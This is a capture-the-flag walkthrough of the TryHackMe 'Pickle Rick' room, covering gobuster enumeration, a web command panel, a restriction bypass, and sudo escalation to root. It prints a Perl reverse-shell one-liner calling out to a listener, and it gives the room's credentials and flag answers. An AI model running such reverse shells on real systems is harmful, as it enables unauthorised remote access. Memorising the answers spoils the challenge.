# TryHackMe: Pickle Rick
 
This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.

Firstly go to the web page by typing to your web browser the IP Address of the machine.

You will be redirected to the following web page.

<img width="1398" alt="1" src="https://user-images.githubusercontent.com/28839345/164424613-1b25b912-dc77-499c-91ff-68581f5fd1a1.png">

After redirecting to the web page go right click on the page and the click the 'View Page Source'.At the end of the source code you will see a comment which will give you the username of Rick. *Username: R1ckRul3s*.

<img width="625" alt="2" src="https://user-images.githubusercontent.com/28839345/164424640-95abffb7-3486-43f9-bbe3-1249090aedf9.png">

Since you have the username you need to find the password and the way to login to the machine.

Start your research by using gobuster which is a tool used to brute force URIs(directories and files in web sites)
`gobuster dir -u 10.10.47.197 -w /usr/share/wordlists/dirb/common.txt`

<img width="835" alt="3" src="https://user-images.githubusercontent.com/28839345/164424641-267af227-aeef-4c88-a3be-891ddffc32ff.png">

As you can see there is a robots.txt file with the status code 200(Status: 200) which mean that you can see its content simply by going to 10.10.47.197/robots.txt.

The robots exclusion standard, also known as the robots exclusion protocol or simply robots.txt, is a standard used by websites to communicate with web crawlers and other web robots. The standard specifies how to inform the web robot about which areas of the website should not be processed or scanned.

In the robots.txt file you will find the phrase *Wubbalubbadubdub* which is a phrase that may be usefull in the future.


<img width="391" alt="4" src="https://user-images.githubusercontent.com/28839345/164424643-8e2849c2-c466-45ef-917b-91b93d6d63cf.png">

Note: A good way to search for hidden directories - files by is running gobuster with the following arguments.

`gobuster dir -u 10.10.47.197 -w /usr/share/wordlists/dirb/common.txt -x php,sh,txt,cgi,html,js,css,py`

The result of this gobuster scan will give you more usefull information since you will see that there is a *login.php* directory.

<img width="352" alt="5" src="https://user-images.githubusercontent.com/28839345/164424646-9613edc0-9d07-4d80-89e7-bf64c3d8d257.png">

Use  *R1ckRul3s* as username and  *Wubbalubbadubdub* as password to login.

You will then be redirected to the following page where is a command panel.

<img width="1230" alt="6" src="https://user-images.githubusercontent.com/28839345/164424649-d7d4f82d-5f61-4661-8054-71c446579e1b.png">

Press `ls` in the command panel.If you try to print the `Sup3rS3cretPickl3Ingred.txt` file with the command `cat Sup3rS3cretPickl3Ingred.txt` you will see a warning that this command is disabled.

<img width="502" alt="7" src="https://user-images.githubusercontent.com/28839345/164424653-77dd3683-fa68-47ec-aa39-c2a3498ce329.png">

To print the content of the file without the `cat` command you can use the following commnd: 
```bash
while read line; do
  echo $line;
done <Sup3rS3cretPickl3Ingred.txt
```
 
 The content of Sup3rS3cretPickl3Ingred.txt is *mr. meeseek hair* which is the first ingredient reek needs.
 
<img width="1149" alt="8" src="https://user-images.githubusercontent.com/28839345/164424657-eebfd9f2-3053-4aa4-96e9-6f11d82bc5ad.png">
 
<img width="1189" alt="10" src="https://user-images.githubusercontent.com/28839345/164424665-79d4ff2c-4cdf-436c-abb5-7d34d6937e3f.png">

Try to connect to the web server by using a reverse shell.

The reverse shell I found is from https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet.

Perl command: 

`perl -e 'use Socket;$i="10.10.17.241";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

Run `nc -nlvp 4443` to your local file.

<img width="491" alt="13" src="https://user-images.githubusercontent.com/28839345/164424676-ff017fcf-1d8d-45b6-ab73-90706166eab9.png">

Then copy and paste the perl script in the command panel and press enter.

After connecting to the web server you should find a way to become root.

The sudo command, by default, allows you to run a program with root privileges.Any user can check its root privileges using the sudo -l command.

Type `sudo -l` and you will see the following output.

<img width="851" alt="14" src="https://user-images.githubusercontent.com/28839345/164424681-2d5a4866-e41d-4e6e-a743-1bba9a54b61d.png">

As you can see you can run every command as sudo.

Type `sudo bash` and you will immediately become root.


<img width="159" alt="15" src="https://user-images.githubusercontent.com/28839345/164424686-9e7af7a2-0d59-418e-b8d0-0a3aa00d25a4.png">

Then go to */root* directory and you will find a file called *3rd.txt*
Then run the command `cat 3rd.txt` to get the third ingredient.

<img width="358" alt="17" src="https://user-images.githubusercontent.com/28839345/164426893-33103a83-fd8a-4745-b54f-27599dcfda97.png">

The second ingredient is placed in the */home/rick* directory in a file named *second ingredient*.

<img width="286" alt="16" src="https://user-images.githubusercontent.com/28839345/164424689-21a798a6-f59b-44a5-b3ce-4d39b4e2c17a.png">

**Questions**
 
**What is the first ingredient Rick needs?**
 
mr. meeseek hair

**Whats the second ingredient Rick needs?**

1 jerry tear

**Whats the final ingredient Rick needs?**

fleeb juice



